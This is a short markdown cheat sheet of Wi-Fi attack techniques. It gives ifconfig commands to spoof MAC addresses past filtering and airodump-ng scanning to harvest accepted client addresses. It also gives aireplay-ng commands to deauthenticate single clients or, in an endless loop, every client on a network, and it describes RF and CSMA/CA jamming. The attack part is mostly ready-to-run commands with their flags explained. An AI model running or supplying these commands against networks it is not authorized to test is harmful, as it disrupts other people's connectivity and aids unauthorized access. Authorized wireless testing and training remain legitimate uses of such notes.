# Wireless mischief

## MAC address filtering

Often access points have a rudimentary security feature that is called MAC address (unique hardware identifier) filtering that only allows known MAC addresses to connect.

To spoof a MAC address

```sh
ifconfig <interface> hw ether <MAC-ADDRESS>
# ie:
ifconfig wlan1 hw ether 00:0F:B5:34:30:30
```

However you must know the MAC address of an accepted device.  To check available MAC addresses in the pool you can use airodump.

First your interface must be set to monitor mode, some cards don't allow it.  Supported cards include (Atheros, Ralink, Prism):

```sh
iwconfig <interface> mode monitor
# set back to managed
iwconfig <interface> mode managed
```

### Scan MAC addresses

You can use airodump-ng to scan

```sh
airodump-ng <interface>
```

Output of first section:

- BSSID: the basic service set identification; equivalent to the MAC address of the access point
- PWR: signal power
- Beacons: number of captured ESSID broadcasts
- Data: # of captured packets
- #/s: # of packets per second
- CH: number of channels used by network
- MB: maximum transfer (specified in the standard)
- ENC: used encryption (OPN/WEP/WPA/WPA2)
- CIPHER: used cipher (WEP/WEP40/WEP104/TKIP/CCMP/WRAP)
- AUTH: used authentication protocol (SKA/PSK/MGT)
- ESSID: the wireless network name

Output of second section:

- BSSID: the MAC address of the access point the client is associated with
- STATION: the MAC address of the client
- PWR: Signal level
- Rate: maximum acheivable speed of data transfer
- Lost: packets lost over 10 seconds
- Packets: number of packets sent by client
- Probes: the network name the client is connecting to

---

### Deauthenticating Clients

Circumventing ESSID hiding (hidden network names):

You can deauthenticate a client, forcing a reconnection and the ESSID will be sent in clear text at logons. Deauthenticating clients (also works with open networks) sends a AP MAC address signed deauthentication packet

```sh
# ie:
aireplay-ng -0 1 -a00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1
```

- -0: the attack number (attack 0 is deauthentication)
- 1: the number of deauthentication packets to be sent, if set to 0 it will continue sending packets until ctrl + c
- -a 00:14:6C:7E:40:80 MAC address of the AP
- -c 00:0F:B5:34:30:30 MAC address of client to be deauthenticated, if not provided then all stations are deauthenticated.
- wlan1: network interface

---

## DoS

### RF Jamming

Involves overpowering the signal of a given AP and interferring with the radio frequency transmission.

### CSMA/CA Jamming (carrier sense multiple access with collision avoidance)

In 802.11 networks using CSMA/CA a station prior to transmitting frames will send out an RTS to see if a collision has occurred, if another station is transmitting at the same time it will wait a random backoff time before attempting to re-transmit.

In this type of disruption an attacker modifies the network card drivers and forces the card to continually send out information without checking for collisions.  The channel is sensed as being busy and other users are forced to wait.

### Deauthentication attack

To force all clients to forcibly reauthenticate.

```sh
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c FF:FF:FF:FF:FF:FF wlan1
aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface>
# FF:FF:FF:FF:FF:FF is the broadcast address which affects all clients
aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface> -D
# -D stops the process from trying to determine the channel
```

- -0: switch for deauthentication
- 0: number of packets, 0 is infinite
- -a: MAC address of access point
- -c: MAC address of client or broadcast address

### Wireless MITM (man in the middle)

Using airbase-ng. TBD

---